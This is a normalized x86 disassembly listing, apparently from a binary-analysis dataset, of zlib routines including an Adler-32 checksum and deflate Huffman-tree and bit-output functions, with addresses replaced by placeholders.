mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + 0xf ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0xc ]
add eax 0x10
mov [ ebp + 0xc ] eax
mov ecx [ ebp - 0xc ]
sub ecx 0x10
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x10 ]
sub ecx [ ebp - 0xc ]
mov [ ebp + 0x10 ] ecx
mov eax [ ebp - 0x4 ]
xor edx edx
mov ecx 0xfff1
div ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
xor edx edx
mov ecx 0xfff1
div ecx
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0xc ]
add edx 0x1
mov [ ebp + 0xc ] edx
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0xc ]
sub ecx 0x1
mov [ ebp - 0xc ] ecx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp - 0xc ] 0x10
jl r-xdata
sub_408980
push ebp
mov ebp esp
call sub_408a16
mov eax [ ebp + 0x8 ]
add eax 0x8c
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xb10 ] eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0xb18 ] rw-data
mov eax [ ebp + 0x8 ]
add eax 0x980
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xb1c ] eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0xb24 ] rw-data
mov eax [ ebp + 0x8 ]
add eax 0xa74
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xb28 ] eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0xb30 ] rw-data
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16ac ] 0x8
mov eax [ ebp + 0x8 ]
push eax
call sub_408a1b
add esp 0x4
pop ebp
retn
sub_408a1b
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] 0x11e
jge r-xdata
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0x8c ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] 0x1e
jge r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0x980 ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] 0x13
jge r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x48c ] 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16a4 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16a0 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16a8 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x1698 ] 0x0
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0xa74 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
sub_408ae4
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] 0x3
mov eax 0x10
sub eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x16b4 ] eax
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x14 ]
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov edx [ ebp + 0x14 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x8 ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x4 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
push 0x1
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40bc62
add esp 0x10
mov esp ebp
pop ebp
retn
sub_408c23
push ebp
mov ebp esp
sub esp 0x20
mov [ ebp - 0x4 ] 0x3
mov eax 0x10
sub eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x16b4 ] eax
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov edx 0x2
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov [ ebp - 0x8 ] 0x2
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x8 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x4 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
xor ecx ecx
mov cx [ r--data ]
mov edx ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
xor eax eax
mov ax [ r--data ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x10 ]
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x10 ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0xc ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
xor eax eax
mov ax [ r--data ]
mov [ ebp - 0xc ] eax
mov ecx 0x10
sub ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x16b4 ] ecx
jle r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16ac ] 0x7
mov esp ebp
pop ebp
retn
mov [ ebp - 0x14 ] 0x3
mov eax 0x10
sub eax [ ebp - 0x14 ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x16b4 ] eax
jle r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_40babd
add esp 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16ac ]
add ecx 0xb
mov edx [ ebp + 0x8 ]
sub ecx [ edx + 0x16b4 ]
cmp ecx 0x9
jge r-xdata
mov ecx [ ebp + 0x8 ]
mov edx 0x2
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov [ ebp - 0x18 ] 0x2
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x18 ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x18 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x14 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
xor ecx ecx
mov cx [ r--data ]
mov edx ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x1c ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
xor eax eax
mov ax [ r--data ]
mov [ ebp - 0x20 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x20 ]
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x20 ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x1c ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
xor eax eax
mov ax [ r--data ]
mov [ ebp - 0x1c ] eax
mov ecx 0x10
sub ecx [ ebp - 0x1c ]
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x16b4 ] ecx
jle r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_40babd
add esp 0x4
sub_409112
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x7c ] 0x0
jle r-xdata
mov eax [ ebp + 0x10 ]
add eax 0x5
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx + 0x1c ]
cmp edx 0x2
jne r-xdata
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
add ecx 0xb10
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_4094ce
add esp 0x8
mov eax [ ebp + 0x8 ]
add eax 0xb1c
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4094ce
add esp 0x8
mov edx [ ebp + 0x8 ]
push edx
call sub_409e05
add esp 0x4
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16a0 ]
add ecx 0xa
shr ecx 0x3
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16a4 ]
add eax 0xa
shr eax 0x3
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp - 0xc ]
ja r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_40b9ca
add esp 0x4
mov [ ebp - 0x18 ] 0x3
mov eax 0x10
sub eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x16b4 ] eax
jle r-xdata
mov [ ebp - 0x10 ] 0x3
mov edx 0x10
sub edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_408ae4
add esp 0x10
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov [ ebp - 0xc ] edx
mov edx [ ebp + 0x14 ]
add edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov edx [ ebp + 0x14 ]
add edx 0x4
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x1c ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x1c ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x18 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
add edx 0x2
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x2
mov [ ebp - 0x14 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x14 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x10 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_408a1b
add esp 0x4
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov edx [ ebp + 0x10 ]
add edx 0x4
cmp edx [ ebp - 0xc ]
ja r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_40bba6
add esp 0x4
mov edx [ ebp - 0x4 ]
add edx 0x1
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xb20 ]
add ecx 0x1
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xb14 ]
add eax 0x1
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40a059
add esp 0x10
mov edx [ ebp + 0x8 ]
add edx 0x980
push edx
mov eax [ ebp + 0x8 ]
add eax 0x8c
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40b182
add esp 0xc
push r--data
push r--data
mov edx [ ebp + 0x8 ]
push edx
call sub_40b182
add esp 0xc
jmp r-xdata
sub_4094ce
push ebp
mov ebp esp
sub esp 0x24
push esi
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x8 ]
mov ecx [ eax ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x8 ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x18 ] 0xffffffff
mov edx [ ebp + 0x8 ]
mov [ edx + 0x1448 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x144c ] 0x23d
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov edx [ ebp - 0x1c ]
cmp edx [ ebp - 0x8 ]
jge r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x1448 ] 0x2
jge r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
xor edx edx
mov dx [ ecx + eax * 4 ]
test edx edx
je r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x18 ]
mov [ ecx + 0x4 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1448 ]
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x1c ] eax
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
jge r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov [ ecx + eax * 4 + 0x2 ] 0x0
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1448 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1448 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1448 ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov [ eax + edx * 4 + 0xb54 ] ecx
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x1c ]
mov [ edx + 0x1450 ] 0x0
jmp r-xdata
cmp [ ebp - 0x1c ] 0x1
jl r-xdata
mov [ ebp - 0x20 ] 0x0
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x20 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x1c ]
add ecx 0x1
mov [ ebp - 0x1c ] ecx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0x1c ]
push edx
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40986e
add esp 0xc
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
xor eax eax
mov ax [ edx + ecx * 4 + 0x2 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x16a4 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16a4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1448 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x1448 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1448 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x20 ]
mov [ ecx + eax * 4 + 0xb54 ] edx
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ edx + ecx * 4 ] 0x1
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
mov [ eax + 0x1450 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x16a0 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16a0 ] edx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x14 ]
xor ecx ecx
mov cl [ eax + 0x1450 ]
mov [ ebp - 0x24 ] ecx
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x1c ]
xor edx edx
mov dl [ ecx + 0x1450 ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov ecx [ ebp - 0x1c ]
sub ecx 0x1
mov [ ebp - 0x1c ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xb58 ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1448 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + eax * 4 + 0xb54 ]
mov [ ecx + 0xb58 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1448 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1448 ] edx
push 0x1
mov ecx [ ebp - 0x10 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40986e
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xb58 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x144c ]
sub eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x144c ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x144c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x1c ]
